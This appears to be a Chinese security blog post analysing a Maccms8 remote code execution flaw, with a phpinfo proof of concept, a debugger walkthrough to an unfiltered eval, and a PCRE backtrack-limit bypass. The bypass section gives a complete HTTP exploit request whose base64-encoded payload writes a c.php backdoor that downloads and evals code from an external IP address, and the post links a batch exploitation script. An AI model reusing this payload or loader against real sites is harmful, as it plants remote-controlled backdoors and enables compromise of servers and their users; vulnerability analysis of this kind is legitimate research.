<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Maccms8最新命令执行漏洞 - F0rmat&#39;Blog</title>
<link rel="stylesheet" type="text/css" href="/css/main.css">
</head>
<body>
<header>
  <div>
    <h1><a href="https://getshe11.com/">F0rmat&#39;Blog</a></h1>
  </div>
  <nav></nav>
</header>
<main>
  <article>
    <div class="title">
  <h1>Maccms8最新命令执行漏洞</h1>
  </div>
<div style="position: fixed; right:-30px; max-width:300px; overflow:auto; top: 1px; width: 300px; bottom:100px">

</div>
<div class="meta">
  <div>2019-12-22 11:17</div>
  <div>
    <span><a href="https://getshe11.com/tags/maccms/">#maccms</a></span>
      </div>
  </div>
<div class="content">
  <h1 id="0x01-前言">0x01 前言</h1>
<p>太久太久没写文章。。。最近还发布了一些法律，许多网站都关了，我还在考虑是否去开这个博客，因为分享技术还得承担法律责任，不过不会再公布具有攻击性的工具或者exp。</p>
<p>这个maccms的RCE是最近被绕过了，写一篇分析文。环境搭建的也不多写了，之前写的一篇Maccms的sql注入http://getshe11.com/2018/08/26/Maccms-sql-injection-analysis/ 有讲到
本文用到的源码可以去https://github.com/yaofeifly/Maccms8.x 这里下载
绕过的源码可以去https://github.com/magicblack/maccms8 下载</p>
<h1 id="0x02-漏洞复现">0x02 漏洞复现</h1>
<ol>
<li>
<p><a href="https://github.com/yaofeifly/Maccms8.x">https://github.com/yaofeifly/Maccms8.x</a> 下载搭建好之后</p>
</li>
<li>
<p>用hackbar</p>
</li>
</ol>
<p>url：http://127.0.0.1/maccms888/?m=vod-search</p>
<p>post：wd={if-A:phpinfo()}{endif-A}</p>
<ol start="3">
<li>
<p>可以看到phpinfo执行了</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms8_rce/1.png" alt="1"></p>
</li>
</ol>
<h1 id="0x03-漏洞分析">0x03 漏洞分析</h1>
<p>phpstorm调试走起，我忽略掉一些步骤，比如怎么用phpstorm调试
这里有写到[Breakpoint debugging with phpstorm+xdebug](<a href="http://getshe11.com/2018/04/10/Breakpoint">http://getshe11.com/2018/04/10/Breakpoint</a> debugging with phpstorm+xdebug/)</p>
<p>这里不下断点直接从开头断下，具体设置在http://getshe11.com/2018/12/22/ThinkPHP5-remote-code-execution-vulnerability-dynamic-analysis/ 有提到。</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms8_rce/2.png" alt=""></p>
<p>当执行到<code>require(MAC_ROOT.'/inc/common/360_safe3.php');</code>我们走进去看下，可以看到匹配规则并没有匹配到我们输入的字符,然后继续往下走了。</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms8_rce/3.png" alt=""></p>
<p>到模板内容替换这一块就不跟大家继续走了，大家有时间可以自己走一遍程序的替换流程，我们直接往下走</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms8_rce/4.png" alt=""></p>
<p>到这里，我们F7跟进去</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms8_rce/5.png" alt=""></p>
<p>F8往下走到<code>eval</code>这里可以看到，除了在接受get、post数据那一块有过滤sql语句的检测，到这里没有任何过滤就直接执行了。</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms8_rce/6.png" alt=""></p>
<h1 id="0x04-80w个a绕过匹配漏洞">0x04 80w个a绕过匹配漏洞</h1>
<p>这个漏洞很有趣，我居然没想到用的是一个P神之前发的一篇文章的<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
<p>这个是Maccms8最新的一个版本里面存在，这个也是修复上面的rce的漏洞的版本。</p>
<p>payload：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> /index.php?m=vod-search <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">xxxx</span>
Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">max-age=0</span>
DNT<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36</span>
Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">zh-CN,zh;q=0.9</span>
Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">800580</span>

wd=union%28这里有80w个a%E4%B8%AAa%29%7Bif-A%3Aprint%28fputs%28fopen%28base64_decode%28Yy5waHA%29%2Cw%29%2Cbase64_decode%28PD9waHAgZnVuY3Rpb24gcygpeyRjb250ZW50cyA9IGZpbGVfZ2V0X2NvbnRlbnRzKCdodHRwOi8vNjcuMTk4LjE4Ni40MjoyOTgwOC9zL2FkbWluZTIxLnR4dCcpO2EoJGNvbnRlbnRzKTt9ZnVuY3Rpb24gYSgkY29ubil7JGIgPSAnICc7ZXZhbCgkYi4kY29ubi4kYik7fXMoKTsgPz4x%29%29%29%7D%7Bendif-A%7D&#34;}&amp;submit=%E6%90%9C+%E7%B4%A2
</code></pre></div><p>执行后会在本目录下生成一个c.php</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms8_rce/7.png" alt=""></p>
<p>这里可以用burp上面的功能来实现这80w个a</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms8_rce/8.png" alt=""></p>
<p>也可以去用我写的一个批量脚本：https://github.com/F0r3at/Python-Tools/blob/master/maccms8_rce.py</p>
<p>不过现在官网github上面修复了，在这里限制了字符的长度。</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/maccms8_rce/9.png" alt=""></p>
<h1 id="0x05-结束">0x05 结束</h1>
<p>最近因为工作，调整不过来，以后会恢复持续输出的！</p>
</div>
<div style="position: fixed; right:50px; max-width:255px; overflow:auto; top: 120px; width: 220px; bottom:90px">










<div class="toc">

    <div class="page-header"><strong>目录</strong></div>

    <div id="page-scrollspy" class="toc-nav">

        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x01-%e5%89%8d%e8%a8%80">
                            0x01 前言
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x02-%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0">
                            0x02 漏洞复现
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x03-%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90">
                            0x03 漏洞分析
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x04-80w%e4%b8%aaa%e7%bb%95%e8%bf%87%e5%8c%b9%e9%85%8d%e6%bc%8f%e6%b4%9e">
                            0x04 80w个a绕过匹配漏洞
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x05-%e7%bb%93%e6%9d%9f">
                            0x05 结束
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        

    </div>

</div>



</div>

  </article>
</main>
<footer>
  <div>
    <div>&copy; 2021 F0rmat. <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC-BY-4.0</a></div>
  </div>
</footer>
</body>
</html>
